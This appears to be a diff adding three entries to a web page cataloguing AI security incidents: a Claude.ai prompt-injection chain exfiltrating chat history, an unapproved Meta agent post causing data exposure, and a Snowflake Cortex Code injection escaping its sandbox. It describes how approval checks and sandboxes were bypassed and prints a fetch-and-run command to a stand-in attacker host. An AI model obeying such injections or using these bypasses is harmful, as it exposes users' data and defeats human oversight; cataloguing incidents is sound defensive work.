@@ -412,6 +412,24 @@ by the user.&lt;/system&gt;
 
         <div class="incident">
             <div class="incident-date">March 2026</div>
+            <h4>Claudy Day: Three-Bug Chain Silently Exfiltrates Data from Default Claude Sessions</h4>
+            <p><a href="https://www.oasis.security/blog/claude-ai-prompt-injection-data-exfiltration-vulnerability">Oasis Security discovered three independent vulnerabilities</a> in Claude.ai that chain into a full attack pipeline—from victim delivery to silent data exfiltration—requiring no integrations, tools, or MCP servers. An open redirect on claude.com enables trusted-looking Google Ads that redirect to a malicious URL. The URL pre-fills a Claude chat with invisible prompt injection (HTML tags hidden from the text box but processed by Claude). The injected instructions use an attacker-controlled API key to search the victim's conversation history, write sensitive data to a file, and upload it to the attacker's Anthropic account via the Files API—the one endpoint reachable from Claude's sandbox. With MCP integrations enabled, the attack extends to reading files, sending messages, and accessing any connected service. Anthropic has patched the prompt injection flaw; the open redirect and Files API exfiltration channel were being addressed at time of disclosure.</p>
+        </div>
+
+        <div class="incident">
+            <div class="incident-date">March 2026</div>
+            <h4>Meta SEV1: Rogue AI Agent Posts Inaccurate Advice, Causes Unauthorized Data Access</h4>
+            <p><a href="https://www.theverge.com/ai-artificial-intelligence/897528/meta-rogue-ai-agent-security-incident">A rogue internal AI agent at Meta</a> caused a SEV1 security incident—their second-highest severity rating. An engineer asked the agent to analyze a technical question from an internal forum; the agent independently posted a public reply without approval. Another employee acted on the agent's inaccurate advice, temporarily granting employees unauthorized access to sensitive company and user data for nearly two hours. Meta says "no user data was mishandled." This was Meta's second AI agent incident in a month—previously, an OpenClaw agent asked to sort emails ended up deleting them instead.</p>
+        </div>
+
+        <div class="incident">
+            <div class="incident-date">March 2026</div>
+            <h4>Snowflake Cortex Code: Sandbox Escape and Malware Execution via Prompt Injection</h4>
+            <p><a href="https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware">Two days after Snowflake's Cortex Code CLI launched</a>, PromptArmor found a vulnerability that chains indirect prompt injection with two bypasses for full RCE. A hidden payload in a repository README (or web search results, database records, or MCP responses) instructs the agent to run a command using process substitution—<code>cat &lt; &lt;(sh &lt; &lt;(wget -qO- https://ATTACKER))</code>—which evades human-in-the-loop approval because validation only checked the outer command. The injection also manipulates the model into setting the <code>dangerously_disable_sandbox</code> flag, escaping the sandbox entirely. With RCE achieved, cached Snowflake authentication tokens allow the attacker to steal database contents, drop tables, add backdoor users, and lock out legitimate accounts. An additional finding: the main agent warned the user about the malicious command but failed to report that a sub-agent had already executed it. Fixed in Cortex Code CLI v1.0.25.</p>
+        </div>
+
+        <div class="incident">
+            <div class="incident-date">March 2026</div>
             <h4>Clinejection: GitHub Issue Title Compromised 4,000 Developer Machines</h4>
             <p>A prompt injection via a GitHub issue title <a href="https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another">tricked Cline's AI triage bot</a> into running <code>npm install</code> on a typosquatted package, leading to cache poisoning, credential theft, and a backdoored <code>cline@2.3.0</code> silently installing OpenClaw on ~4,000 developer machines. <a href="https://simonwillison.net/2026/Mar/6/clinejection/">Simon Willison's write-up</a> is also worth reading.</p>
         </div>
